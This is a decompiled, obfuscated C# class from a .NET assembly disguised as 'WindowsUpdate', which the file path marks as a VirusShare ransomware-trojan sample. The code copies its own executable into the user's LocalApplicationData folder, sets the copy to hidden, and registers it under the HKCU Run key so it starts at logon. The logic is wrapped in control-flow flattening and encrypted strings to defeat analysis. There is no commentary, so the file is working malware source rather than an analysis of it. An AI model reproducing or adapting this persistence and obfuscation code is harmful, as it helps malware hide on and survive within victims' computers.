// Decompiled with JetBrains decompiler
// Type: BrowserDene.Utils
// Assembly: WindowsUpdate, Version=1.4.0.5, Culture=neutral, PublicKeyToken=null
// MVID: D1EB6377-81DE-4056-9753-780C121AEDC7
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\HEUR-Trojan-Ransom.Win32.Generic-6e065f6ddd2c4b4483851ccf9b71e0323841c5568581bbeafc41eb6ea6c6d888.exe

using eJnHnFFEpEmlCQmkVB;
using eYO1TM7iGlKLL86lCw;
using Microsoft.Win32;
using System;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace BrowserDene
{
  internal class Utils
  {
    private const string RegKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    private const int FEATURE_DISABLE_NAVIGATION_SOUNDS = 21;
    private const int SET_FEATURE_ON_PROCESS = 2;
    public static object Regkeyname;
    public static object DstName;

    [DllImport("urlmon.dll")]
    [return: MarshalAs(UnmanagedType.Error)]
    private static extern int CoInternetSetFeatureEnabled(
      int FeatureEntry,
      [MarshalAs(UnmanagedType.U4)] int dwFlags,
      bool fEnable);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void DisableClickSounds() => Utils.CoInternetSetFeatureEnabled(21, 2, true);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void Copy(object src, object dst)
    {
      int num = 4;
      if (true)
        goto label_2;
label_1:
      Utils.xuYSYmagM0LV1xGckha(dst, FileAttributes.Normal);
      goto label_6;
label_2:
      while (true)
      {
        switch (num)
        {
          case 1:
          case 3:
            goto label_1;
          case 4:
            if (Utils.cPrG86arHvnWaSF5g2J(dst))
            {
              Utils.NxIkvhahFrvdZLwfrfj();
              num = Utils.ayjTaBaTcCUijJu3fQM() ? 0 : 3;
              continue;
            }
            goto label_6;
          case 5:
            goto label_3;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:
      try
      {
        Utils.y7IygYaEhye6OHMGrSD(src, dst, true);
      }
      catch (Exception ex)
      {
      }
      Utils.xuYSYmagM0LV1xGckha(dst, FileAttributes.Hidden);
      num = 5;
      goto label_2;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void Startup(object name, object path)
    {
      Utils.NxIkvhahFrvdZLwfrfj();
      int num = Utils.ayjTaBaTcCUijJu3fQM() ? 2 : 4;
      RegistryKey registryKey;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 4:
            registryKey = (RegistryKey) Utils.pdP9wuadVRijxQjXpMq((object) Registry.CurrentUser, (object) empvh6dZSo5pSUG8BZ.eF0YZf0gO(1386), true);
            goto case 1;
          case 1:
          case 2:
            if (registryKey == null)
            {
              num = 3;
              continue;
            }
            Utils.CCkbvGaqNW59AVqhByZ((object) registryKey, name, path);
            goto case 5;
          case 3:
            goto label_4;
          case 5:
            Utils.HmBjMKa4QTn8vVaFBTL((object) registryKey);
            num = 6;
            continue;
          case 6:
            goto label_6;
          default:
            if (true)
            {
              num = 5;
              continue;
            }
            goto label_10;
        }
      }
label_4:
      return;
label_6:
      return;
label_10:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void DstCheck()
    {
      int num1 = 1;
      if (true)
        goto label_8;
label_1:
      string str1 = (string) Utils.IRQX2RaychMyvW3obK6(Environment.SpecialFolder.LocalApplicationData);
      Utils.ayjTaBaTcCUijJu3fQM();
      if (Utils.NxIkvhahFrvdZLwfrfj())
      {
        if (false)
          return;
        num1 = 4;
      }
      else
      {
        int num2 = 0;
        num1 = Utils.ayjTaBaTcCUijJu3fQM() ? num2 : num2;
      }
label_8:
      string str2;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_9;
          case 1:
            str2 = (string) Utils.tKtYulaIssw8tgLcuVB(Utils.k8GcGqaPd00LGgV471I());
            num1 = 5;
            continue;
          case 2:
          case 4:
            goto label_6;
          case 3:
            goto label_7;
          case 5:
            goto label_1;
          case 6:
            goto label_4;
          default:
            goto label_12;
        }
      }
label_6:
      while (!Utils.lMxo8XaFs1xYC6rkvx1(Utils.q01cxnaWFU7VLQTDEom((object) str2), (object) str1))
      {
        Utils.pMd5qWa2qYSTuy4iU2i((object) str2, Utils.E9NWd5afXQrjDD1sNfG((object) str1, (object) empvh6dZSo5pSUG8BZ.eF0YZf0gO(1480), Utils.DstName));
        if (true)
        {
          num1 = 6;
          goto label_8;
        }
      }
      return;
label_9:
      return;
label_7:
      return;
label_4:
      return;
label_12:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public Utils()
    {
      Utils.oPP0o1a6yo44IbuYNOt();
      Utils.HkSiacaBK8PTlvxWRIS((object) this);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    static Utils()
    {
      int num = 0;
      while (true)
      {
        switch (num)
        {
          case 0:
            Utils.oPP0o1a6yo44IbuYNOt();
            Utils.ayjTaBaTcCUijJu3fQM();
            num = !Utils.NxIkvhahFrvdZLwfrfj() ? 4 : 3;
            continue;
          case 1:
          case 3:
            Utils.Regkeyname = (object) empvh6dZSo5pSUG8BZ.eF0YZf0gO(1486);
            break;
          case 5:
            goto label_4;
        }
        Utils.DstName = (object) empvh6dZSo5pSUG8BZ.eF0YZf0gO(1516);
        num = 5;
      }
label_4:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool NxIkvhahFrvdZLwfrfj() => true;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool ayjTaBaTcCUijJu3fQM() => false;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool cPrG86arHvnWaSF5g2J([In] object obj0) => File.Exists((string) obj0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void xuYSYmagM0LV1xGckha([In] object obj0, [In] FileAttributes obj1) => File.SetAttributes((string) obj0, obj1);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void y7IygYaEhye6OHMGrSD([In] object obj0, [In] object obj1, [In] bool obj2) => File.Copy((string) obj0, (string) obj1, obj2);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object pdP9wuadVRijxQjXpMq([In] object obj0, [In] object obj1, [In] bool obj2) => (object) ((RegistryKey) obj0).OpenSubKey((string) obj1, obj2);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void CCkbvGaqNW59AVqhByZ([In] object obj0, [In] object obj1, [In] object obj2) => ((RegistryKey) obj0).SetValue((string) obj1, obj2);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void HmBjMKa4QTn8vVaFBTL([In] object obj0) => ((RegistryKey) obj0).Close();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object k8GcGqaPd00LGgV471I() => (object) Assembly.GetExecutingAssembly();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object tKtYulaIssw8tgLcuVB([In] object obj0) => (object) ((Assembly) obj0).Location;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object IRQX2RaychMyvW3obK6([In] Environment.SpecialFolder obj0) => (object) Environment.GetFolderPath(obj0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object q01cxnaWFU7VLQTDEom([In] object obj0) => (object) Path.GetDirectoryName((string) obj0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool lMxo8XaFs1xYC6rkvx1([In] object obj0, [In] object obj1) => (string) obj0 == (string) obj1;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object E9NWd5afXQrjDD1sNfG([In] object obj0, [In] object obj1, [In] object obj2) => (object) ((string) obj0 + (string) obj1 + (string) obj2);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void pMd5qWa2qYSTuy4iU2i([In] object obj0, [In] object obj1) => Utils.Copy(obj0, obj1);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void oPP0o1a6yo44IbuYNOt() => eWK97ZHZd8El3E8K9m.fPYcDOPz3is7I();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void HkSiacaBK8PTlvxWRIS([In] object obj0) => obj0.\u002Ector();
  }
}
